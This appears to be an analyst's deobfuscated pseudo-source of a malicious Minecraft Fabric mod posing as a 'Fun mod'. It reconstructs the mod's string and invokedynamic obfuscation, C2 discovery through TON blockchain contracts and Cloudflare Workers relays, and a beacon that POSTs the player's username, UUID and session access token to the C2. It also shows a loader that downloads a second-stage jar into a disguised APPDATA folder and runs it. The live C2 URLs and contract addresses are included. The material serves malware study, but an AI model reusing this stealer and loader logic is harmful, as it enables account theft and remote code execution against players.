// ============================================================================
// DonutDuper+ (fabric.mod.json id: "hello-world-fabric", name "Fun mod",
// author "FunMaster") — fully deobfuscated / renamed pseudo-source.
//
// Generated mechanically by deobf.py (string layer + invokedynamic layer
// resolved), then hand-renamed. Original names are kept in /*original*/ comments.
//
// Package aurora -> classes:
//   orchid  -> DonutDuperClient   (Fabric client entrypoint)
//   rattle  -> C2AndLoader
//   pillar  -> Telemetry
//   sardine -> McReflect
//   nutmeg  -> IndyResolver       (invokedynamic bootstrap = call obfuscator)
//   fable   -> StringDecoder
//   medal   -> DeadCode           (opaque predicate, always false)
// ============================================================================

// ---------------------------------------------------------------------------
// StringDecoder  /* fable */  — the string layer
// ---------------------------------------------------------------------------
final class StringDecoder /* fable */ {
    // stream(encoded, key):
    //   encoded = lowercase letters a..p, '-' separated; each PAIR of letters is
    //   one byte as two nibbles (a=0 .. p=15). '-' is a separator only.
    //   Each byte is XORed with byte number (index & 3) of the 32-bit key
    //   (little-endian), so the key cycles every 4 bytes.
    //   Vineflower prints the key as e.g.  6039 << 16 | (char)-19995
    //   (a second, unused branch handles chars >= 256 as raw byte-per-char).
    static String stream(String enc, int key) { ... }
}

// ---------------------------------------------------------------------------
// IndyResolver  /* nutmeg */  — the call layer
// ---------------------------------------------------------------------------
// Every method call / constructor / field access in the malware is compiled as
// an invokedynamic whose bootstrap is:
//     fresco(Lookup, String decoyName, MethodType, String blob, int key, int kind)
// blob decodes (via StringDecoder.stream) to:  "owner\0member\0(method)descriptor"
// kind: 0=static 1=virtual 2=constructor 3=special 4=static-get 5=static-set
//       6=getter 7=setter
// It builds the MethodHandle at runtime and returns a ConstantCallSite, so the
// real call targets never appear in the constant pool as Methodref entries.
final class IndyResolver /* nutmeg */ {
    static CallSite fresco(Lookup l, String decoy, MethodType type, String blob, int key, int kind) {
        String s = StringDecoder.stream(blob, key);
        String owner = s.split("\0")[0].replace('/', '.');
        String member = s.split("\0")[1];
        String desc = s.split("\0")[2];
        MethodHandle mh = switch (kind) { /* findStatic/findVirtual/findConstructor/... */ };
        return new ConstantCallSite(mh.asType(type));
    }
}

// ---------------------------------------------------------------------------
// DeadCode  /* medal */  — opaque predicate / anti-analysis filler
// ---------------------------------------------------------------------------
final class DeadCode /* medal */ {
    private static int flower = 0;
    static int prawn()  { return flower; }
    static void coyote(){ flower = flower; }   // value never changes
}
// Every method starts with:  if (medal.prawn() != 0) medal.coyote();
// -> always false, pure noise. Removed from the code below.

// ---------------------------------------------------------------------------
// McReflect  /* sardine */  — Minecraft access without compile-time mappings
// ---------------------------------------------------------------------------
final class McReflect /* sardine */ {
    static MappingResolver resolver = FabricLoader.getInstance().getMappingResolver();

    static Object mcClient() /* pastel */ {
        return FabricLoader.getInstance().getGameInstance();   // MinecraftClient
    }

    // call a no-arg method, trying the Mojang/official name first, then the
    // intermediary name mapped through Fabric's MappingResolver.
    static Object callNoArgs(/*spring*/) (Object o, String owner, String officialName,
                                          String intermediaryName, String desc) throws ReflectiveOperationException {
        try {
            return o.getClass().getMethod(officialName).invoke(o);
        } catch (NoSuchMethodException e) {
            String mapped = mapName(owner, intermediaryName, desc);
            return o.getClass().getMethod(mapped).invoke(o);
        }
    }

    static Object tryMethods(/*quake*/) (Object o, String... names) { ... }

    static String mapName(/*otter*/) (String owner, String intermediary, String desc) {
        String m = resolver.mapMethodName("intermediary", owner, intermediary, desc);
        return (m != null && !m.isBlank()) ? m : intermediary;
    }
}

// ---------------------------------------------------------------------------
// Telemetry  /* pillar */  — crash / error beacon to the same C2
// ---------------------------------------------------------------------------
final class Telemetry /* pillar */ {
    static final int MAX_REPORTS = 6;                 /* stumble */
    static final AtomicInteger sent = new AtomicInteger();   /* marina */
    static final Set<String> seen = ConcurrentHashMap-backed set;  /* dune */
    static volatile String cachedBase;                       /* goblet */

    static void error(String where, Throwable t)   /* sherbet */ { pagoda(where, "error", msg(t), t); }
    static void fatal(String where, String msg)    /* mobile  */ { pagoda(where, "fatal", msg, null); }

    static void pagoda(String where, String level, String msg, Throwable t) {
        // dedupe on "where|msg", max 6 reports per run, then POST (thread "err-report",
        // daemon, 6 s timeouts):
        //   POST <C2>/error   Content-Type: application/json   UA: Mozilla/5.0
        // (C2 base is resolved once and cached, via C2AndLoader.resolveC2)
        // body:
        // {"src":"pussyback","level":<level>,"where":<where>,"key":<CAMPAIGN_KEY raw>,
        //  "v":<computerName>,"pc":<computerName>,"os":<os.name>,"msg":<msg>,"stack":<top 10 frames>}
        // computerName = %COMPUTERNAME% else System.getProperty("user.name")
    }
}

// ---------------------------------------------------------------------------
// C2AndLoader  /* rattle */  — C2 discovery, second-stage download + execution
// ---------------------------------------------------------------------------
class C2AndLoader /* rattle */ {
    static final String C2_PRIMARY = "https://relay-3f9c71.kartohaantoha36-6a9.workers.dev";  /* slipper */
    static final String C2_MIRROR  = "https://relay-mirror.kartohaantoha36-6a9.workers.dev";  /* ember  */

    // TON smart contract that stores the live C2 list (config relay).
    static final String TON_CONFIG_CONTRACT = "EQChU6Zxa_y2fKeeCaSDubGcFZizRdRVSArwAh6qJtfe9NKZ"; /* cipher */

    // campaign / install id sent with every beacon ("receiver"/"key")
    public static String CAMPAIGN_KEY =
        "5af99dfc-41c6-451e-b4cd-22c99b9a4e9c======================================================================"; /* laptop */
    // (sent as CAMPAIGN_KEY.replace("=","") -> "5af99dfc-41c6-451e-b4cd-22c99b9a4e9c")

    static final Pattern CELL_PATTERN = Pattern.compile("\"cell\":\"([0-9a-fA-F]+)"); /* cradle */

    // ---- second stage -----------------------------------------------------
    public static void loadSecondStage(String username, String uuid, String accessToken) /* pendant */ {
        new Thread(() -> {
            for (String url : payloadUrls() /* gadget */) {
                try {
                    byte[] jar = httpGetBytes(url);                 // plankton
                    File stage = writeStageJar(jar);                // rambler
                    if (stage == null) continue;                    // must contain core/core.class
                    ClassLoader cl = new URLClassLoader(new URL[]{stage.toURI().toURL()},
                                                        C2AndLoader.class.getClassLoader());
                    invokeStage2(cl, username, uuid, accessToken, CAMPAIGN_KEY);   // kayak
                    return;
                } catch (Throwable t) { Telemetry.error("Coffe/star " + url, t); }
            }
            Telemetry.fatal("Coffe/star", "all payload sources failed");
        }).start();
    }

    // drops to  %APPDATA%\Microsoft\JavaSec\stage.jar   (fake "Microsoft/JavaSec")
    static File writeStageJar(byte[] data) /* rambler */ {
        File dir = new File(System.getenv("APPDATA"), "Microsoft/JavaSec");
        dir.mkdirs();
        File part = new File(dir, "stage.part");
        File jar  = new File(dir, "stage.jar");
        try (FileOutputStream out = new FileOutputStream(part)) { out.write(data); out.getFD().sync(); }
        Files.copy(part.toPath(), jar.toPath(), REPLACE_EXISTING);
        part.delete();
        return new ZipFile(jar).getEntry("core/core.class") != null ? jar : null;
    }

    // loads class "core.core" and reflectively calls its first method matching
    // (String,String,String,String) or (String,String,String,String,int)
    // NOTE: the raw padded CAMPAIGN_KEY (with the "=" tail) is passed here,
    // while the /report beacon sends it with "=" stripped.
    static void invokeStage2(ClassLoader cl, String a, String b, String c, String d) /* kayak */ {
        Class<?> k = cl.loadClass("core.core");
        Method m = <4-String or 4-String+int method>;
        m.setAccessible(true);
        Object inst = Modifier.isStatic(m) ? null : k.getDeclaredConstructor().newInstance();
        m.invoke(inst, a, b, c, d);          // username, uuid, MINECRAFT ACCESS TOKEN, key
    }

    // ---- C2 discovery -----------------------------------------------------
    public static String resolveC2() /* samba */ {
        try {
            String fromContract = tonContractLookup(8);      // apple
            String live = pickLiveUrl(fromContract, 8000);   // rivet
            if (live != null) return live;
        } catch (Exception ignored) {}
        return urlAlive(C2_PRIMARY, 8000) ? C2_PRIMARY : C2_MIRROR;
    }

    // reads the C2 list out of the TON contract's data, via toncenter.com:
    //   POST https://toncenter.com/api/v2/runGetMethod
    //   {"address":"EQChU6...e9NKZ","method":"link","stack":[["int","8"]]}
    // response field "b64":"<base64>" -> base64 -> comma-separated https URLs
    static String tonContractLookup(int arg) /* apple */ { ... }

    // fallback C2 discovery through TON transaction messages:
    //   GET https://tonapi.io/v2/blockchain/accounts/<addr>/methods/getMessage
    //   -> "cell":"<hex>" -> tonCellToString() -> base URL -> <base>/api/hlam/files/4001
    static List<String> payloadUrls() /* gadget */ {
        LinkedHashSet<String> out = new LinkedHashSet<>();
        String cfg = httpGetText(resolveC2() + "/config", 12000);
        if (cfg != null) {
            out.addAll(splitUrls(jsonField(cfg, "0")));
            out.addAll(splitUrls(jsonField(cfg, "7")));
        }
        if (out.isEmpty()) {
            for (String tonAddr : new String[]{
                    "EQCsNH1LY2PQeqG2HKSk2myObNTgCuREdq1IVvZFL4k_5iia",
                    "EQBaz-F9o6nHrQ16Z_jTGZShLyRNEMRtS0OWMYs0GNQK_PHA"}) {
                String u = tonApiGetMessage(tonAddr);        // maroon
                if (u != null) {
                    if (!u.startsWith("http")) u = "https://" + u;
                    if (!u.contains("/api/"))  u = trimTrailingSlash(u) + "/api/hlam/files/4001";
                    out.add(u);
                }
            }
        }
        // expand every *.workers.dev URL into its two hardcoded relay mirrors
        List<String> all = new ArrayList<>();
        for (String u : out) { all.add(u); all.addAll(mirrorUrls(u)); }
        return all;
    }

    static List<String> mirrorUrls(String u) /* remark */ {
        // if host ends with ".workers.dev", re-point its path at C2_PRIMARY/C2_MIRROR
    }

    static String tonCellToString(String hex) /* stork */ {
        // minimal TON Cell parser: header byte -> ref counts, then skips the
        // descriptor/level sections and returns the cell's byte payload as UTF-8.
    }
}

// ---------------------------------------------------------------------------
// DonutDuperClient  /* orchid */  — Fabric client entrypoint
// ---------------------------------------------------------------------------
public class DonutDuperClient /* orchid */ implements ClientModInitializer {

    public void onInitializeClient() {
        // 1) global crash beacon
        Thread.setDefaultUncaughtExceptionHandler((t, e) ->
            Telemetry.fatal("thread:" + t.getName(), "uncaught: " + e, e));

        try {
            Object mc        = McReflect.mcClient();                       // MinecraftClient
            Object profile   = McReflect.callNoArgs(mc, "net.minecraft.class_310",
                               "getUser", "method_1548", "()Lnet/minecraft/class_320;");
            String username  = str(McReflect.callNoArgs(profile, "net.minecraft.class_320",
                               "getName",       "method_1676",  "()Ljava/lang/String;"));
            String uuid      = str(McReflect.callNoArgs(profile, "net.minecraft.class_320",
                               "getProfileId",  "method_44717", "()Ljava/util/UUID;"));
            String token     = str(McReflect.callNoArgs(profile, "net.minecraft.class_320",
                               "getAccessToken","method_1674",  "()Ljava/lang/String;"));
            // token == "null" -> ""

            String key  = C2AndLoader.CAMPAIGN_KEY.replace("=", "");
            String base = C2AndLoader.resolveC2();
            System.out.println("[thin] start");

            // 2) exfiltrate the session to <C2>/report, thread "thin-report"
            new Thread(() -> {
                long backoff = 15000;
                for (int attempt = 0; attempt < 24; attempt++) {
                    int code = -1;
                    try {
                        HttpURLConnection c = (HttpURLConnection)
                            new URL(base + "/report").openConnection();
                        c.setRequestMethod("POST");
                        c.setDoOutput(true);
                        c.setConnectTimeout(15000);
                        c.setReadTimeout(15000);
                        c.setRequestProperty("Content-Type", "application/json");
                        c.setRequestProperty("User-Agent",
                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                            "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
                        c.getOutputStream().write((
                            "{\"name\":\""   + esc(username) +
                            "\",\"uuid\":\"" + esc(uuid) +
                            "\",\"token\":\"" + esc(token) +          // <-- STEALS THE SESSION TOKEN
                            "\",\"receiver\":\"" + esc(username) +
                            "\",\"key\":\""   + esc(key) + "\"}"
                        ).getBytes(UTF_8));
                        code = c.getResponseCode();
                        c.disconnect();
                    } catch (Exception e) { if (attempt % 5 == 0) System.out.println("[thin] retry err=" + e.getMessage()); }

                    if (code >= 200 && code < 300) { System.out.println("[thin] ok code=" + code); return; }
                    if (code >= 400 && code < 500 && code != 429) { System.out.println("[thin] give up code=" + code); return; }
                    try { Thread.sleep(backoff); } catch (InterruptedException e) { return; }
                    backoff = Math.min(backoff * 2, 300000);   // 15s .. 5min, 24 tries
                }
            }, "thin-report").start();

            // 3) drop & run second stage (skipped only if the token is 15 chars long)
            if (token.length() != 15) {
                C2AndLoader.loadSecondStage(username, uuid, token);
            }
        } catch (ReflectiveOperationException e) {
            Telemetry.error("Fun/init", e);
        } catch (Throwable e) {
            Telemetry.fatal("Fun/init", "init failed: " + e, e);
        }
    }
}
